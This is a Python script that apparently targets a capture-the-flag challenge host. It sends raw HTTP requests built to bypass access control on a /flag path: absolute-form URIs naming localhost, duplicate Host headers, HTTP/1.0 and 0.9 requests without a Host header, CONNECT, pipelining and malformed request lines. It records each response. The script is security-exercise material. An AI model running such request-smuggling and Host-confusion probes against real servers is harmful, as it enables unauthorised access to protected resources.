#!/usr/bin/env python3
import hashlib
import json
import socket
import time
from pathlib import Path

TARGET = "2273095efcf1270253338a5c.http-ctf2.dasctf.com"
PORT = 80
OUT = Path("/tmp/branch004_http_parser")

cases = {
    # Baselines.
    "h11_root": f"GET / HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "h11_flag": f"GET /flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "h11_single": f"GET /branch004x HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "h11_multi": f"GET /branch004x/y HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # HTTP version / Host requirement.
    "h10_root_nohost": "GET / HTTP/1.0\r\nConnection: close\r\n\r\n",
    "h10_flag_nohost": "GET /flag HTTP/1.0\r\nConnection: close\r\n\r\n",
    "h10_flag_host": f"GET /flag HTTP/1.0\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # Absolute-form request target.
    "abs_root": f"GET http://{TARGET}/ HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "abs_flag": f"GET http://{TARGET}/flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "abs_localhost_flag": f"GET http://localhost/flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # Duplicate Host ordering.
    "dup_good_local": f"GET /flag HTTP/1.1\r\nHost: {TARGET}\r\nHost: localhost\r\nConnection: close\r\n\r\n",
    "dup_local_good": f"GET /flag HTTP/1.1\r\nHost: localhost\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "dup_good_good": f"GET /flag HTTP/1.1\r\nHost: {TARGET}\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # Special request-target forms.
    "options_star": f"OPTIONS * HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "get_star": f"GET * HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "double_slash_flag": f"GET //flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "triple_slash_flag": f"GET ///flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "query_only": f"GET ?flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # Request-line whitespace parsing.
    "tab_separators": f"GET\t/flag\tHTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "double_space": f"GET  /flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",

    # Cross-check which authority is consumed at each layer.
    "abs_good_host_local": f"GET http://{TARGET}/flag HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n",
    "abs_ip_host_good": f"GET http://117.21.200.176/flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "h10_host_local": "GET /flag HTTP/1.0\r\nHost: localhost\r\nConnection: close\r\n\r\n",
    "host_uppercase": f"GET /flag HTTP/1.1\r\nHost: {TARGET.upper()}\r\nConnection: close\r\n\r\n",
    "host_trailing_dot": f"GET /flag HTTP/1.1\r\nHost: {TARGET}.\r\nConnection: close\r\n\r\n",
    "host_explicit_port": f"GET /flag HTTP/1.1\r\nHost: {TARGET}:80\r\nConnection: close\r\n\r\n",

    # Remaining standard authority-form and legacy version probes.
    "connect_authority": f"CONNECT {TARGET}:80 HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n",
    "h09_flag": "GET /flag\r\n",
    "pipeline_control": (
        f"GET /health HTTP/1.1\r\nHost: {TARGET}\r\nConnection: keep-alive\r\n\r\n"
        f"GET /flag HTTP/1.1\r\nHost: {TARGET}\r\nConnection: close\r\n\r\n"
    ),
}


def transact(raw: str):
    started = time.monotonic()
    chunks = []
    error = None
    try:
        with socket.create_connection((TARGET, PORT), timeout=5) as sock:
            sock.settimeout(3)
            sock.sendall(raw.encode("ascii"))
            while True:
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    break
                if not chunk:
                    break
                chunks.append(chunk)
    except Exception as exc:
        error = repr(exc)
    return b"".join(chunks), round(time.monotonic() - started, 3), error


def summarize(name: str, raw_req: str, response: bytes, elapsed: float, error):
    head, sep, body = response.partition(b"\r\n\r\n")
    lines = head.split(b"\r\n") if head else []
    status = lines[0].decode("latin1", "replace") if lines else ""
    headers = {}
    for line in lines[1:]:
        if b":" in line:
            k, v = line.split(b":", 1)
            headers.setdefault(k.decode("latin1").lower(), []).append(
                v.strip().decode("latin1", "replace")
            )
    return {
        "name": name,
        "request_line": raw_req.split("\r\n", 1)[0],
        "status": status,
        "response_bytes": len(response),
        "body_bytes": len(body) if sep else 0,
        "body_sha256": hashlib.sha256(body).hexdigest()[:16],
        "server": headers.get("server", []),
        "location": headers.get("location", []),
        "elapsed": elapsed,
        "error": error,
        "body_preview": body[:140].decode("utf-8", "replace").replace("\n", " "),
    }


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    summaries = []
    for name, request in cases.items():
        response, elapsed, error = transact(request)
        (OUT / f"{name}.request").write_bytes(request.encode("ascii"))
        (OUT / f"{name}.response").write_bytes(response)
        summaries.append(summarize(name, request, response, elapsed, error))
    (OUT / "summary.json").write_text(
        json.dumps(summaries, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    for item in summaries:
        print(
            f"{item['name']:20} {item['status'] or '-':24} "
            f"resp={item['response_bytes']:4} body={item['body_bytes']:4} "
            f"sha={item['body_sha256']} err={item['error'] or '-'}"
        )


if __name__ == "__main__":
    main()
